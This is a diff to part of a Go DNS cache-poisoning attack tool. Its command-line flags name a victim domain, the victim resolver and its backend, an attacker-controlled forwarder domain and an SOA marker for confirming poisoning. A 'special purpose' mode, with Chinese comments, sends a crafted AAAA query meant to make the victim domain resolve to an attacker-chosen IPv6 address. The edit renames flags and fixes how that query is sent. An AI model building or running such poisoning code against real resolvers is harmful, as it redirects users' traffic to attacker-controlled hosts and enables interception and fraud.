@@ -454,11 +454,11 @@ func main() {
 	//auxiliaryDomain := flag.String("ad", "", "Attacker-controlled domain used to host the fake NS for the victim domain and to store the fake AAAA record of the victim domain.")
 	attackertarget := flag.String("at", "", "攻击者想要更改到的IPv6地址")
 	debugOutput := flag.Bool("d", false, "Debug output mode.")
-	attackerMaliciousDomain := flag.String("f", "", "Attacker controlled domain used in the forwarder attack, this will enable the forwarder attack mode.")
+	attackerMaliciousDomain := flag.String("af", "", "Attacker controlled domain used in the forwarder attack, this will enable the forwarder attack mode.")
 	soaName := flag.String("soa", "", "SOA name of the victim domain on attacker-controlled name server used to indicate the resolver has been poisoned. (Resolver attack only.)")
 
 	//特殊用途
-	isfake := flag.String("F", "0", "")
+	isfake := flag.Int("f", 0, "")
 	flag.Parse()
 	//gatewayMac, _ := net.ParseMAC(*gateWayMacStr)
 	Main(*ifaceName, net.ParseIP(*authServer), net.ParseIP(*resolver), net.ParseIP(*resolverBackend), *startPort, *endPort, *victimDNSName, *dnsQueryTmeout, *defaultJitter,
@@ -468,23 +468,25 @@ func main() {
 
 func Main(ifaceName string, authIPArg net.IP, resolverIPArg net.IP, resolverBackendIPArg net.IP, startPort uint, endPort uint, victimDNSNameArg string, dnsQueryTimeout uint,
 	defaultJitterArg uint, attackerMaliciousDomainArg string, resolverBackendList string, debugOutputArg bool, repeatTimesArg uint, timeGapArg uint, attackertargetIP string,
-	soaNameArg string, isfake string) {
+	soaNameArg string, isfake int) {
 	fmt.Println("/***Please make sure to fill every argument carefully and correct. Otherwise the program will crash.***/")
-
 	// 特殊用途
-	if isfake == "1" {
+	if isfake == 1 {
 		c := new(dns.Client)
 		msg := new(dns.Msg)
 		if strings.Contains(attackertargetIP, ":") {
+			println("目标："+resolverBackendIPArg.String())
 			ipcode := strings.ReplaceAll(attackertargetIP, ":", "-")
 			if victimDNSNameArg[len(victimDNSNameArg)-1:] != "." {
 				victimDNSNameArg = victimDNSNameArg + "."
 			}
 			domain := ipcode + "." + victimDNSNameArg
 			msg.SetQuestion(domain, dns.TypeAAAA)
-			_, _, _ = c.Exchange(msg, resolverBackendIPArg.String())
+			_, _, _ = c.Exchange(msg, net.JoinHostPort(resolverBackendIPArg.String(),"53"))
 			return
 		} else {
+			println(attackertargetIP)
+			println(victimDNSNameArg)
 			println("参数有误，请输入IPv6地址作为篡改目标结果")
 		}
 
